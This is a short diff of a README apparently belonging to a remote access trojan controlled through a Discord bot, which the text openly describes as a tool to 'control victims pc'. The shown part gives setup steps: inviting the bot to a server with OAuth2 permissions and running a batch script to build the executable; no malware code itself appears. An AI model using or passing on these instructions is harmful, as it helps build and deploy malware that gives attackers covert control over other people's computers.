@@ -24,6 +24,7 @@ Cool remote access trojan to control victims pc via discord bot. No port forward
 6. Now your ready to invite your bot to your server, go to the the [developer page](https://discord.com/developers) and go to the page `OAuth2` and enable these options
 <img alt="OAuth2" src="https://cdn.discordapp.com/attachments/905814376043401249/906199066965336094/unknown.png">
 7. now copy the given url and paste it in your browser to invite the bot to your server
+
 8. When your done with all of that, simply open **build-exe.bat** and enter a name for the exe and now your done!
 
 
